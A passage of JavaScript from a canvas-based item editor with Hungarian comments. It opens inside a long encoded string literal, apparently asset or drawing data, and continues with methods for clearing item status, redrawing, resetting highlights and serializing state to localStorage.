wFlonFoF5GxW1QAWxVxW1VlOxSAWxVyobBTBLFTM3BTBLSTOnFoFwFlJnFoF4GxW1QAWxVxW1VlOxGxWxVysyBTBLFTM3BTBLSLMnFoFwFlJnFoF3SRW1QAWxVxW1VlOxGxWxVyJ2BTBLFTM2BTBLGyVnFoFwFlJnFoF2GxW1QAWxVxW1VlOxSAWxVycqBTBLFTM4BTBLGTWnFoFwFlsnFoF1GRW1QAW1QAWxSRWyVeinFlswGlonFoFwFTcnFoFnGWMnGWMwGlonFoFwFTcnFoFwGyFnFoFwFTWnFoFwGyJnFoFwFTHnGWVnFoFnGWMwSLOnFoFwFLWnFoFwSLOnFoFwFLcnFoFwSLFnFoFwFLOnGWVnFoFnGWMwSLVnFoF5GaWxVyO4GRWxVyoxBTBLFTs3BTBLSTHnGWVnFoFnGWMwSLsnFoF4SAWxVyO4SAWxVys4BTBLFTs4BTBLSLsnGWVnFoFnGWMwSLsnFoF4SAWxVyO5FAWxVys4BTBLFTowBTBLSLcnGWVnFoFnGWMwSTMnFoF4GRWxVyO5FaWxVysbBTBLFToxBTBLSLMnGWVnFoFnGWMwSTFnFoF4FAWxVyO5GAWxVyJ4BTBLFTobBTBLGysnGWVnGWVnFlonFbBqBTM4FTobBTBLGyJnFlonFbBiBTM4BTM5BTGAfxWxSLO2GAWxVysxBTBLBTXABTXAFTcbBTBLSLMnFoFwGlcnFoF4FaWxVyO2SAWxVysyBTXOBTBLBTXAFTc5BTBLSLFnFoFwGyOnFoF4GAWxVyO3FaWxVysbBTXOBTBLBTXAFTJyBTBLSLVnFoFwGyWnFoF4GAWxVyO3GaWxVysyBTXOBTBLBTXAFTJ3BTBLSLFnFoFwGyJnFoF4FaWxVyO3GxWxVysxBTXOBTBLBTXAFTJ3BTBLSLMnFoFwGycnFoF4FRWxVyO3GRWxVysqBTXOBTBLBTXAFTJbBTBLSLHnFoFwGyMnFoF4FAWxVyO2SRWxVysqBTXOBTBLBTXAFTc3BTBLSLHnFoFwGlVnFoF4FaWxVyO2GAWxVysxBTXOBTXOBTBLrUB1dRWxSRWyVeinFlswFyWnFoF3SAWxVxW1VaW1VlOyGRWxVyJ4BTBLFTF3BTBLSLHnFoFwFyonFoF4FAW1QAWxVxW1VlObFRWxVyswBTBLFTVyBTBLSLHnFoFwGLWnFoF4FAW1QAWxVxW1VlObGaWxVyswBTBLFTV5BTBLSLOnFoFwGLonFoF4FRW1QAWxVxW1VlObSRWxVyswBTBLFTV5BTBLGyonFoFwGLcnFoF3SAW1QAWxVxW1VlObFxWxVyJ2BTBLFTVyBTBLGycnFoFwGLHnFoF3GaW1QAWxVxW1VlOyGxWxVyJ2BTBLFTF1BTBLGysnFoFwFyWnFoF3SAW1QAW1QAWxV3QxrYWnFlonFbBhBTM4FTJwBTBLSLHnFoFnGWMnGWMwGyOnFoF4FAWxVyO3FRWxVyswBTBLFTJxBTBLSLOnGWVnFoFnGWMwGyMnFoF4FRWxVyO3FxWxVysqBTBLFTJyBTBLSLHnGWVnGWVnFlonFbBhBTM4FTc5BTBLSLHnFoFnGWMnGWMwGlonFoF4FaWxVyO3FAWxVysxBTBLFTJqBTBLSLMnGWVnFoFnGWMwGyOnFoF4FxWxVyO3FxWxVysyBTBLFTJbBTBLSLMnGWVnFoFnGWMwGyWnFoF4FAWxVyO3GRWxVysqBTBLFTJ1BTBLSLHnGWVnGWVnFlonFbBhBTM4FTVxBTBLGycnFoFnGWMnGWMwGLMnFoF3GaWxVyObFRWxVyJ3BTBLFTVxBTBLGyJnGWVnFoFnGWMwGLFnFoF3SAWxVyObFxWxVyJ4BTBLFTVyBTBLGysnGWVnFoFnGWMwGLVnFoF3GxWxVyObGAWxVyJ3BTBLFTVbBTBLGyJnGWVnGWVnFlonFbBhBTM4FTVqBTBLGycnFoFnGWMnGWMwGLHnFoF3GaWxVyOySRWxVyJ4BTBLFTVqBTBLGyonGWVnFoFnGWMwGLMnFoF4FAWxVyObFxWxVysqBTBLFTVbBTBLGyonGWVnFoFnGWMwGLcnFoF3SAWxVyObGaWxVyJ4BTBLFTV2BTBLGysnGWVnGWVnFlonFbBhBTM4FTcqBTBLSLsnFoFnGWMnGWMwGlHnFoF4SAWxVyO1SRWxVysbBTBLFTcxBTBLSLMnGWVnFoFnGWMwGlWnFoF4FRWxVyO2GRWxVysqBTBLFTc4BTBLGyonGWVnFoFnGWMwGyHnFoF3SRWxVyO3GAWxVyJ4BTBLFTJ2BTBLGysnGWVnFoFnGWMwGysnFoF3SAWxVyO3SRWxVyJ4BTBLFTswBTBLGysnGWVnFoFnGWMwSLMnFoF3GxWxVyO4GaWxVyJ4BTBLFTs2BTBLGysnGWVnGWVnFlonFbBhBTM4FTcbBTBLSLOnFoFnGWMnGWMwGlVnFoF4FRWxVyO2GRWxVyJ4BTBLFTc4BTBLGysnGWVnFoFnGWMwGyHnFoF3GxWxVyO3FRWxVyJ4BTBLFTJyBTBLGyJnGWVnFoFnGWMwGyVnFoF3GaWxVyO3GAWxVyJ2BTBLFTJ2BTBLGycnGWVnFoFnGWMwGysnFoF3GRWxVyO4FRWxVyJ2BTBLFTsxBTBLGycnGWVnFoFnGWMwSLFnFoF3GRWxVyO4GaWxVyJ1BTBLFTs2BTBLGyWnGWVnGWVnFlonFbBqBTM4FTs2BTBLGyJnFlonFbBiBTM4BTM5BTGAfxWxSLO1FRWxVys1BTBLBTXABTXAFTWwBTBLSLWnFoFwGTMnFoF4FaWxVyO1FAWxVysqBTXOBTBLBTXAFTV4BTBLGyJnFoFwGLHnFoF3GRWxVyOySAWxVyJbBTXOBTBLBTXAFTF3BTBLGyFnFoFwFyHnFoF3FaWxVyOyFAWxVyJxBTXOBTXOBTM5BTGAJAWxSLOyFAWxVyJqBTM5BTGAJRWxSLOyFAWxVyJqBTBLFTF3BTBLGyOnFoFwGLHnFoF3FaWxSRWyVuOnFlswGLMnFoF3FxWxVyObGRWxVyJ1BTBLFTV2BTBLGyWnFlonFbBwBTM4FTV3BTBLGycnFoFwGLonFoF3GaWxVyObSRWxVyJ2BTM5BTGAJRWxSLObSRWxVyJ3BTBLFTWqBTBLGyonFoFwGTHnFoF3SRWxSRWyVeqnFlsnFlonFbBhBTM4FTV3BTBLFTO4BTBLBTXABTXAFTVxBTBLFTO3BTBLFTVwBTBLFTMqBTBLFTVyBTBLFTMyBTXOBTBLBTXAFTV1BTBLFTM1BTBLFTV5BTBLFTM1BTBLFTWwBTBLFTMyBTXOBTBLBTXAFTWyBTBLFTMwBTBLFTWxBTBLFTMqBTBLFTWqBTBLFTO4BTXOBTBLBTXAFTV4BTBLFTO3BTBLFTV3BTBLFTO4BTBLFTV3BTBLFTO4BTXOBTXOBTBLrUB1dRWxSRWyVeinFlswGLWnFoFwFlVnFoFnGWMnGWMwGLWnFoFwFlVnFoFwGLFnFoFwFlMnFoFwGLVnFoFwFlOnGWVnFoFnGWMwGLcnFoFwFTonFoFwGTHnFoFwFTsnFoFwGTHnFoFwFTsnGWVnGWVnFlonFbBhBTM4FTcxBTBLFTF1BTBLBTXABTXAFTcxBTBLFTF1BTBLFTW3BTBLFTVqBTBLFTW2BTBLFTVwBTXOBTBLBTXAFTW1BTBLFTVyBTBLFTWbBTBLFTV3BTBLFTWyBTBLFTV4BTXOBTBLBTXAFTWwBTBLFTV5BTBLFTWwBTBLFTV5BTBLFTWwBTBLFTV5BTXOBTXOBTM5BTGAJAWxSLO1FRWxVyObSRWxSRWyVeqnFlsnFlonFbBhBTM4FToqBTBLSLHnFoFnGWMnGWMwSTHnFoF4FAWxVyO5FAWxVyJyBTBLFToqBTBLGlonGWVnFoFnGWMwSTOnFoF2GaWxVyO5FaWxVycyBTBLFToxBTBLGlOnGWVnFoFnGWMwSTOnFoF1SRWxVyO5FAWxVyW1BTBLFTs3BTBLGTVnGWVnFoFnGWMwSLFnFoF1GAWxVyO4FxWxVyWbBTBLFTsyBTBLGTVnGWVnGWVnFlonFbBhBTM4FTM4BTBLGTWnFoFnGWMnGWMwFlsnFoF1GRWxVyOxGxWxVyWwBTBLFTFqBTBLGLsnGWVnFoFnGWMwFyVnFoFbGRWxVyOySRWxVyVbBTBLFTF5BTBLGLVnGWVnFoFnGWMwFyonFoFbGAWxVyOyGaWxVyV1BTBLFTF1BTBLGLFnGWVnFoFnGWMwFyVnFoFbFRWxVyOyFRWxVyF1BTBLFTF2BTBLFyonGWVnFoFnGWMwGLOnFoFbFaWxVyObFRWxVyVyBTBLFTVyBTBLGLMnGWVnFoFnGWMwGLWnFoFbFaWxVyObGRWxVyVxBTBLFTV1BTBLGLMnGWVnGWVnFlonFbBhBTM4FTVxBTBLGLHnFoFnGWMnGWMwGLMnFoFbFAWxVyObGRWxVyF3BTBLFTV4BTBLFyJnGWVnFoFnGWMwGTMnFoFySAWxVyO1FaWxVyVqBTBLFTW1BTBLGLHnGWVnFoFnGWMwGTsnFoFbFAWxVyO2FRWxVyF5BTBLFTcwBTBLFyonGWVnFoFnGWMwGlOnFoFySRWxVyO1SRWxVyVxBTBLFTc1BTBLGLFnGWVnFoFnGWMwGyHnFoFbGAWxVyO3FxWxVyV1BTBLFTJbBTBLGLFnGWVnFoFnGWMwGycnFoFbFRWxVyO3FxWxVyV2BTBLFTJ4BTBLGLWnGWVnFoFnGWMwSLFnFoFbGAWxVyO4GaWxVyVbBTBLFTsbBTBLGLJnGWVnFoFnGWMwSLOnFoF1FAWxVyO5FaWxVyV1BTBLFTs3BTBLGLonGWVnFoFnGWMwSLMnFoF1FxWxVyO4SAWxVyWxBTBLFTs4BTBLGTMnGWVnGWVnFlonFbBqBTM4FTsbBTBLGTFnFlonFbBiBTM4BTM5BTGAfxWxSLOxGxWxVyJ5BTBLBTXABTXAFTM3BTBLGyonFoFwFlWnFoF3GaWxVyOxGRWxVyJyBTXOBTBLBTXAFTM1BTBLGyHnFoFwFlcnFoF2SRWxVyOxGaWxVyc1BTXOBTBLBTXAFTM2BTBLGlMnFoFwFlWnFoF2FAWxVyOxGaWxVyW3BTXOBTBLBTXAFTM2BTBLGTFnFoFwFlcnFoFbSAWxVyOxGaWxVyV1BTXOBTBLBTXAFTM3BTBLGLMnFoFwFlJnFoFySRWxVyOxSAWxVyF1BTXOBTBLBTXAFTM5BTBLFyMnFoFwFlonFoFxSRWxVyOxSRWxVyM5BTXOBTXOBTM5BTGAJAWxSLOyFRWxVyM5BTM5BTGAJRWxSLOyFRWxVyM5BTBLFTFyBTBLFyMnFoFwFyWnFoFyFxWxSRWyVuOnFlswFysnFoFyFxWxVyObGaWxVyFbBTBLFTWqBTBLFyFnFlonFbBwBTM4FTWbBTBLFyMnFoFwGTWnFoFxSRWxVyO1SAWxVyM2BTM5BTGAJRWxSLO2FAWxVyMyBTBLFTcxBTBLFlOnFoFwGlVnFoFxFRWxSRWyVuOnFlswGlcnFoFxFaWxVyO2GxWxVyMbBTBLFTc4BTBLFlcnFlonFbBwBTM4FTc4BTBLFlsnFoFwGlsnFoFyFxWxVyO3GAWxVyF2BTM5BTGAJRWxSLO4FAWxVyF5BTBLFTsyBTBLGLHnFoFwSLcnFoFbFAWxSRWyVuOnFlswSTHnFoFbFAWxVyO5FAWxVyVqBTBLFToyBTBLFyonFlonFbBwBTM4FTo1BTBLFysnFoFwSTsnFoFyGAWxVyO5SAWxVyFbBTM5BTGAJAWxSLO5SAWxVyF4BTM5BTGAIAWxSAWxSRWyVeinFlswSTOnFoF3SRWxVxW1VaW1VlO5FRWxVyJ5BTBLFToxBTBLGyonFoFwSTFnFoF3GxW1QAWxVxW1VlO5GAWxVyJ1BTBLFToyBTBLGyFnFoFwSTVnFoF3FRW1QAWxVxW1VlO5GRWxVyJqBTBLFTo3BTBLGlsnFoFwSTJnFoF2GRW1QAWxVxW1VlO5GxWxVycxBTBLFTo2BTBLGlVnFoFwSTJnFoF2FRW1QAWxVxW1VlO5SAWxVyW4BTBLFTo5BTBLGlHnFoFwSTonFoF1GaW1QAWxVxW1VlO5SAWxVyWxBTBLFTo3BTBLGTHnFoFwSTsnFoFbGxW1QAWxVxW1VlO5SRWxVyVbBTBLFlHqBTBLGLVnFoFwSTonFoFbFRW1QAWxVxW1VlO5SRWxVyF5BTBLFTo3BTBLFyJnFoFwSTJnFoFyGxW1QAW1QAWxSRWyVe+nFlswSTonFoFxGAWxVxW1VaW1VlO5SRWxVyVqBTXOBTXOBTM5BTGAfxWxSLO2GRWxVyO4BTBLBTXABTXAFTc1BTBLFTsnFoFwGlJnFoFxFAWxVyO2SRWxVyO4BTXOBTBLBTXAFTJxBTBLFTJnFoFwGyVnFoFwGxWxVyO3SAWxVyO3BTXOBTBLBTXAFTswBTBLFTJnFoFwSLWnFoFwGxWxVyO5FAWxVyO5BTXOBTBLBTXAFTo2BTBLFlOnFoFwSTonFoFxGAWxVyO5SRWxVyMbBTXOBTXOBTM5BTGAfxWxSLOxSRWxVyM5BTBLBTXABTXAFTM5BTBLFlonFoFwFlonFoFxGAWxVyOyFAWxVyMwBTXOBTBLBTXAFTFqBTBLFTsnFoFwFyHnFoFwGRWxVyOyFxWxVyO1BTXOBTBLBTXAFTF2BTBLFTWnFoFwFycnFoFwFxWxVyObGRWxVyOyBTXOBTBLBTXAFTWbBTBLFTFnFoFwGTFnFoFwGAWxVyO1GxWxVyO2BTXOBTBLBTXAFTcxBTBLFTsnFoFwGlWnFoFwSAWxVyO2GRWxVyO4BTXOBTXOBTM5BTGAfxWxSLObGRWxVyO1BTBLBTXABTXAFTV1BTBLFTWnFoFwFysnFoFwFxWxVyOyGRWxVyO3BTXOBTBLBTXAFTFwBTBLFlHnFoFwFyMnFoFwSRWxVyOyFRWxVyMyBTXOBTBLBTXAFTFwBTBLFlJnFoFwFyMnFoFxSAWxVyOyGRWxVyFqBTXOBTBLBTXAFTF3BTBLFyMnFoFwGLsnFoFyFxWxVyO1FRWxVyFwBTXOBTBLBTXAFTW1BTBLFlsnFoFwGTonFoFxGAWxVyO1SRWxVyMqBTXOBTBLBTXAFTW5BTBLFTJnFoFwGTJnFoFwGaWxVyO1FxWxVyO2BTXOBTBLBTXAFTWqBTBLFTWnFoFwGLWnFoFwGRWxVyObGRWxVyO1BTXOBTXOBTBLrUB1dRWxSRWyVeinFlswSLVnFoFwSRWxVxW1VaW1VlO4GAWxVyO5BTBLFTowBTBLFlHnFoFwSTVnFoFxFxW1QAWxVxW1VlO5GxWxVyM3BTBLFTo3BTBLFlonFoFwSTcnFoFyFxW1QAWxVxW1VlO5GRWxVyF3BTBLFToyBTBLFyonFoFwSLFnFoFyGxW1QAWxVxW1VlO3FaWxVyFbBTBLFTJwBTBLFyFnFoFwGlonFoFxSAW1QAWxVxW1VlO2SAWxVyMyBTBLFTc4BTBLFlHnFoFwGyMnFoFwSRW1QAWxVxW1VlO3GRWxVyO4BTBLFTsbBTBLFTonFoFwSLVnFoFwSRW1QAW1QAWxSRWyVeinFlswGLMnFoFwFaWxVxW1VaW1VlObFaWxVyOxBTBLFTV4BTBLSRWxVyO1FaWxVyOqBTXOBTBLBTXAFTW3BTBLFTMnFoFwGTcnFoF4BTBLFTW5BTBLSAW1QAWxVxW1VlO2FaWxVyonFoFwGlMnFoFwFaWxVyO2GaWxVyOxBTXOBTBLBTXAFTJwBTBLFTFnFoFwGyWnFoFwFRWxVyO3SAWxVyOxBTXOBTBLBTXAFTsxBTBLFTFnFoFwSLVnFoFwFaWxVyO4GaWxVyObBTXOBTBLBTXAFTs3BTBLFTcnFoFwSLsnFoFwSRWxVyO4SAWxVyO5BTXOBTXOBTM5BTGAfxWxSLO5SAWxVyOxGRWxVxW1VaW1VlO5SAWxVyOxGRWxVyO5FaWxVyOwFRWxVyO5FaWxVyo3BTXOBTBLBTXAFToxBTBLSLVnFoFwSTcnFoF3GRWxVyMqFAWxVyJyBTXOBTBLBTXAFlHbBTBLGyMnFoFxFLJnFoF3FaWxVyMqGxWxVyJxBTXOBTBLBTXAFlH3BTBLGyMnFoFwSTonFoF3GRWxVyO5GxWxVysxBTXOBTBLBTXAFTo1BTBLSLsnFoFwSTWnFoFwFLOnFoFwSTJnFoFwFLonGWVnFoFnGWMwSTonFoFwFTJnFoFxFLHnFoFwFlVnFoFxFLHnFoFwFlVnGWVnGWVnFoGbJuXnBTM5BTGAfxWxSLMqGaWxVyJxBTBLBTXABTXAFlH2BTBLGyMnFoFxFTMnFoF3FRWxVyMwSAWxVyJ1BTXOBTBLBTXAFlMyBTBLGysnFoFxFlFnFoF3SAWxVyMxFxWxVyJ4BTXOBTXOBTM5BTGAfxWxSLO3SAWxVyOxFAWxVxW1VaW1VlO3SAWxVyOxFAWxVyO4FRWxVyOwGxWxVyO4FaWxVyOwFaW1QAWxVxW1VlO4FxWxVyOqSAWxVyO4FaWxVyOqGaWxVyO4FaWxVyOqGaW1QAW1QAWxSRWyVeinFlswSLHnFoFwGLHnFoFnGWMnGWMwSLHnFoFwGLHnFoFwSLFnFoFwGLMnFoFwSLFnFoFwGLHnGWVnFoFnGWMwSLMnFoFwFyonFoFwSLOnFoFwFycnFoFwSLMnFoFwFycnGWVnFoFnGWMwSLVnFoFwFyJnFoFwSLsnFoFwFyonFoFwSLcnFoFwFyJnGWVnFoFnGWMwSLWnFoFwFyVnFoFwSLMnFoFwFyHnFoFwSLWnFoFwFyMnGWVnFoFnGWMwSLsnFoFwFyFnFoFwSTHnFoFwFyVnFoFwSLonFoFwFyMnGWVnFoFnGWMwSLonFoFwFyHnFoFwSLsnFoFwFlsnFoFwSTHnFoFwFlonGWVnFoFnGWMwSTOnFoFwFyOnFoFwSTVnFoFwFyHnFoFwSTFnFoFwFlonGWVnFoFnGWMwSTOnFoFwFlJnFoFwSTMnFoFwFlcnFoFwSTFnFoFwFlsnGWVnFoFnGWMwSTWnFoFwFlonFoFwSTcnFoFwFlonFoFwSTWnFoFwFlcnGWVnFoFnGWMwSTVnFoFwFlVnFoFwSTWnFoFwFlVnFoFwSTcnFoFwFlWnGWVnFoFnGWMwSTsnFoFwFlJnFoFxFLOnFoFwFlcnFoFwSTonFoFwFlVnGWVnFoFnGWMwSTJnFoFwFlOnFoFwSTcnFoFwFlHnFoFxFLHnFoFwFlMnGWVnFoFnGWMxFLVnFoFwFlFnFoFxFLVnFoFwFlOnFoFxFLMnFoFwFTonGWVnFoFnGWMxFLHnFoFwFTcnFoFxFLOnFoFwFTMnFoFxFLFnFoFwFTcnGWVnFoFnGWMxFLVnFoFwFTonFoFxFLonFoFwFTcnFoFxFLcnFoFwFTFnGWVnFoFnGWMxFLFnFoFwFLonFoFxFLFnFoFwFLJnFoFxFLcnFoFwFLonGWVnFoFnGWMxFLsnFoFwFTOnFoFxFLonFoFwFLonFoFxFLsnFoFwFLcnGWVnFoFnGWMxFLJnFoFwFLVnFoFxFLcnFoFwFLMnFoFxFLsnFoFwFLFnGWVnFoFnGWMxFTOnFoFwFLVnFoFxFTMnFoFwFLVnFoFxFTOnFoFwFLMnGWVnFoFnGWMxFLonFoFwFLOnFoFxFTHnFoF5SRWxVyMwFaWxVyOqFAW1QAWxVxW1VlMwFxWxVyOqFaWxVyMwGAWxVyOqFRWxVyMwFxWxVyo5BTXOBTBLBTXAFlOxBTBLSTcnFoFxFTVnFoF5GAWxVyMwGRWxVyo1BTXOBTBLBTXAFlO3BTBLSTJnFoFxFTonFoF5GAWxVyMwSRWxVyoyBTXOBTBLBTXAFlO4BTBLSTOnFoFxFTsnFoF4SAWxVyMxFAWxVys4BTXOBTBLBTXAFlMxBTBLSLsnFoFxFlMnFoF4SRWxVyMxGAWxVys4BTXOBTBLBTXAFlM2BTBLSLJnFoFxFyOnFoF4GaWxVyMxGxWxVysbBTXOBTBLBTXAFlMxBTBLSLFnFoFxFlFnFoF4FaWxVyMxGAWxVyswBTXOBTBLBTXAFlM2BTBLSLHnFoFxFlsnFoF3GxWxVyMxGRWxVyJ4BTXOBTBLBTXAFlMxBTBLSLHnFoFxFlFnFoF3GxWxVyMxGRWxVyJ2BTXOBTBLBTXAFlM4BTBLGyWnFoFxFlcnFoF3FxWxVyMxGAWxVyJ1BTXOBTBLBTXAFlMwBTBLGyJnFoFxFTonFoF3GaWxVyMxFRWxVyJ1BTXOBTBLBTXAFlMxBTBLGyFnFoFxFlHnFoF3FaWxVyMxFAWxVyJbBTXOBTBLBTXAFlO5BTBLGyJnFoFxFTonFoF3GaWxVyMwSRWxVyJ2BTXOBTXOBTM5BTGAfxWxSLOxFAWxVyo3BTBLBTXABTXAFTMqBTBLSTJnFoFwFlMnFoF5GAWxVyOxGAWxVyobBTXOBTBLBTXAFTM3BTBLSTFnFoFwFlsnFoF5FxWxVyOxSAWxVyoyBTXOBTXOBTM5BTGAfxWxSLOxFAWxVyo5BTBLBTXABTXAFTMqBTBLSTonFoFwFlVnFoF5SRWxVyOxGxWxVyOqFAW1QAWxVxW1VlOxSRWxVyOqFAWxVyOyFAWxVyOqFRWxVyOyFAWxVyOqFRW1QAW1QAWxSRWyVe+nFlswGlsnFoFwGTJnFoFnGWMnGWMwGyMnFoFwGyMnGWVnGWVnFlonFbBhBTM4FyOnFoF5SAWxVxW1VaW1VlFwBTBLSTsnFoFxGaWxVyOqFAWxVyMxBTBLFTHbBTXOBTBLBTXAFTonFoFwFLsnFoFwGxWxVyOwSRWxVyO3BTBLFTO5BTXOBTXOBTM5BTGAfaWxSLMxBTBLFTHbBTBLBTXABTXAFTVnFoFwFLonGWVnGWVnFlonFbBhBTM4FyonFoFwFlcnFoFnGWMnGWMySRWxVyOxGaWxVyV3BTBLFTVxBTBLGTHnFoFwGLcnGWVnFoFnGWM1FxWxVyO1FRWxVycbBTBLFTW5BTBLGlsnFoFwGlWnGWVnFoFnGWM3FaWxVyO3FAWxVyJyBTBLFTJyBTBLGyFnFoFwGyFnGWVnFoFnGWM3FxWxVyO3FxWxVyJ2BTBLFTc3BTBLGyJnFoFwGlWnGWVnFoFnGWM3SAWxVyO2FxWxVyJ5BTBLFTcwBTBLGyonFoFwGlOnGWVnGWVnFlonFbBhBTM4FysnFoFwGTHnFoFnGWMnGWMySRWxVyO1FAWxVyWwBTBLFTV5BTBLGTOnFoFwGLonGWVnFoFnGWM1FRWxVyObSRWxVyW1BTBLFTWxBTBLGTWnFoFwGTVnGWVnFoFnGWM1GAWxVyO1GaWxVyWqBTBLFTW4BTBLGTWnFoFwGlOnGWVnFoFnGWM1SRWxVyO2GAWxVyc5BTBLFTc4BTBLGlonFoFwGlsnGWVnGWVnFlonFbBhBTM4FlJnFoF1SRWxVxW1VaW1VlMbBTBLGTcnFoFxGRWxVyW2BTBLFlcnFoF1FaW1QAWxVxW1VlM2BTBLGLsnFoFxFxWxVyVbBTBLFlVnFoFbFaW1QAWxVxW1VlM1BTBLGLOnFoFxFRWxVyF4BTBLFlFnFoFyFxW1QAWxVxW1VlM2BTBLFlsnFoFxGAWxVyM2BTBLFlsnFoFxFAW1QAWxVxW1VlFyBTBLFTFnFoFySRWxVycnFoFySRWxVycnGWVnGWVnFlonFbBqBTM4GLOnFoFyBTM5BTGAIAWxSAWxSRWyVeinFlswFlOnFoF2FAWxVxW1VaW1VlOxFAWxVyW5BTBLFTMxBTBLGTonFoFwFlMnFoF1FxW1QAWxVxW1VlOxFaWxVyV2BTBLFTMbBTBLGLonFoFwFlVnFoFbFxW1QAWxVxW1VlOxGRWxVyF4BTBLFTM3BTBLFycnFoFwFlWnFoFyFAW1QAWxVxW1VlOxFaWxVyM1BTBLFTMyBTBLFTonFoFwFlHnFoFwGaW1QAWxVxW1VlOwGxWxVyOxBTBLFTOxBTBLSAWxVyOwFAWxVyWnGWVnFoFnGWMwFLJnFoFwBTBLFTHbBTBLFAWxVyOqGAWxVyHnGWVnGWVnFlonFbBhBTM4GLFnFoFbSRWxVxW1VaW1VlVyBTBLGLonFoFyGaWxVyWwBTBLFyWnFoF1GAW1QAWxVxW1VlFyBTBLGTcnFoFyFxWxVyW2BTBLFyFnFoF1GaW1QAW1QAWxSRWyVeinFls1GaWxVyMqBTBLBTXABTXAGTcnFoFxFAWxVycbBTBLFTonFoF2SRWxVyMxBTXOBTBLBTXAGyVnFoFxGRWxVyJ2BTBLFlFnFoF4FAWxVyM1BTXOBTBLBTXASLVnFoFxGxWxVys3BTBLFlOnFoF4GaWxVyFwBTXOBTBLBTXASLWnFoFbFAWxVysyBTBLGLFnFoF4FxWxVyVyBTXOBTXOBTM5BTGAJAWxSLsyBTBLGLFnFlonFbBiBTM4BTM5BTGAfxWxSLs4BTBLFlJnFoFnGWMnGWM4SAWxVyM3BTBLSTOnFoFxSRWxVyowBTBLFyMnGWVnFoFnGWM5FRWxVyF1BTBLSTHnFoFySRWxVyoqBTBLGLMnGWVnFoFnGWM4SRWxVyV2BTBLSTOnFoF1FRWxVyowBTBLGTOnGWVnGWVnFlonFbBhBTM4STMnFoFxSRWxVxW1VaW1VloxBTBLFlonFoF5FxWxVyF1BTBLSTWnFoFySAW1QAWxVxW1Vlo2BTBLGLMnFoFwFLHnFoFbSAWxVyOqFAWxVyV4BTXOBTXOBTM5BTGAfxWxSLo2BTBLFyOnFoFnGWMnGWM5GaWxVyFwBTBLFTHwBTBLFyMnFoFwFLFnFoFyGaW1QAWxVxW1VlOqGRWxVyVqBTBLFTHbBTBLGLWnFoFwFLVnFoFbGRW1QAW1QAWxSRWyVeinFlswFLWnFoFySAWxVxW1VaW1VlOqGRWxVyF4BTBLFTOqBTBLFysnFoFwFLonFoFbFRW1QAWxVxW1VlOqSAWxVyV1BTBLFTH1BTBLGLonFoFwFLJnFoF1FRW1QAWxVxW1VlOwFAWxVyWyBTBLFTObBTBLGTVnFoFwFTVnFoF1GAW1QAW1QAWxSRWyVeinFlswFTHnFoFbFaWxVxW1VaW1VlOwFAWxVyVxBTBLFTOxBTBLGLVnFoFwFTMnFoFbGxW1QAWxVxW1VlOwFaWxVyV5BTBLFTOxBTBLGLonFoFwFTMnFoFbSRW1QAW1QAWxSRWyVeinFlswFTFnFoFbGAWxVxW1VaW1VlOwFxWxVyVbBTBLFTObBTBLGLsnFoFwFTcnFoFbSRW1QAWxVxW1VlOwSAWxVyV5BTBLFTMqBTBLGTHnFoFwFlHnFoF1FAW1QAW1QAWxSRWyVeinFls1GAWxVyMqBTBLBTXABTXAGTVnFoFxFAWxVyV5BTBLFlMnFoF1FAWxVyM2BTXOBTBLBTXAGTOnFoFyFAWxVyWqBTBLFyMnFoF1FAWxVyFxBTXOBTXOBTM5BTGAfxWxSLV4BTBLFlVnFoFnGWMnGWMbSAWxVyMbBTBLGLWnFoFxFaWxVyV2BTBLFlcnGWVnFoFnGWMbGaWxVyFqBTBLGTMnFoFyFaWxVyWqBTBLFycnGWVnFoFnGWMbSRWxVyVqBTBLGLJnFoFbFRWxVyV3BTBLGLOnGWVnGWVnFlonFbBhBTM4GLFnFoFxSRWxVxW1VaW1VlVyBTBLFlonFoFySRWxVyFxBTBLFyonFoFyGAW1QAWxVxW1VlVqBTBLFycnFoFbGAWxVyF3BTBLGLMnFoFySRW1QAWxVxW1VlF5BTBLGLOnFoFyGaWxVyVxBTBLFycnFoFbFaW1QAW1QAWxSRWyVe8nFlsnFlonGbQzDewgIeXLc0HnFbVnFlrxI3XkdAWxGxWyVeOkIEnkdWgpfY4nFbVnFlrxI3XkdAWxGxWyVeOkIYnbd0BFfY1grAWyQLOqBTGAcR5ifY5nX2norEsnFbV1BTGAcR5yrUBpf2XTrUnidRWyQAWxGxWxF2dedededaWxGxWyVeWnFlsnFlonFbBzDewgIeX0fYQbfAWyQLOnFbBzDuGbJe9hdXGbPYwnBTGOBTM3BTMyFLHqFLHqBTM3BTGAdRWxSAWxSRWyVeVkdeniINGbPYwnBTGOBTM3BTMyFLHqFLHqBTM3BTGAdA5efYwiXEX4rAWxSAWxG1G6cYwpIe5zBTMqBWW5JxWxFOGgc2OnFlJnFoFxGLHnFoFbGTHnFlonFbBoDeQxc0rBIYNudRWxSEFnFoFxFAWxVyM5FAWxSRWyVaW3QAW3QAWxSRWxSEGbPAWxSVKK"));
   	}

	/**
	 * Ráépülők állapotának alaphelyzetbe állítása.
	 * 
	 * @method clearFollows
	 * @param {String} id Elem azonosító
	 */
	this.clearFollows = function(id){
		// var follows = items.getFollows(id),
		// 	length  = follows.length;

		// for(var i = 0; i < length; i++){
		// 	if(follows[i].properties.status != "normal"){
		// 		EventBus.dispatch("clearFollows", this, follows[i].id);
		// 	}
		// }

		// var item = items.getItemById(id);
		// if(!item.properties.forced){
		// 	item.properties.status = "normal";
		// }
		// EventBus.dispatch("redrawItem", this, id);

		var item = items.getItemById(id);
		item.properties.status = "normal";

		items.refresh();
		EventBus.dispatch("redrawAll", this);
	}

	/**
	 * Újrarajzolás esemény kezelő
	 *
	 * @method redrawEventHandler
	 * @param {Object} eventarg
	 * @param {String} arg Elem azonosító
	 */
	this.redrawEventHandler = function(eventarg, arg){

		this.drawItem(arg);
	}

	/**
	 * Kurzor alaphelyzetbe állító esemény kezelése.
	 *
	 * @method clearCursorEventHandler
	 */
	this.clearCursorEventHandler = function(){
		canvas.style.cursor = "default";
		EventBus.dispatch("clearHighlights", this);
	}

	/**
	 * Kiemelés törlés esemény kezelő
	 *
	 * @method clearHighlightEventHandler
	 */
	this.clearHighlightsEventHandler = function(){
		var itemList = items.getItems(),
			length   = itemList.length;

		for(var i = 0; i < length; i++){
			if(itemList[i].properties.highlight || itemList[i].properties.pendent){
				itemList[i].properties.highlight = false;
				itemList[i].properties.pendent   = false;
				EventBus.dispatch("redrawItem", this, itemList[i].id);
			}
		}
	}

	/**
	 * Összeállítás állapotkódjának előállítása
	 *
	 * @method serialize
	 * @return {String} Állapotkód
	 */
	this.serialize = function(){
		var serialized = items.serialize();
		localStorage.setItem(currentID, serialized);
		return serialized;
	}

	/**
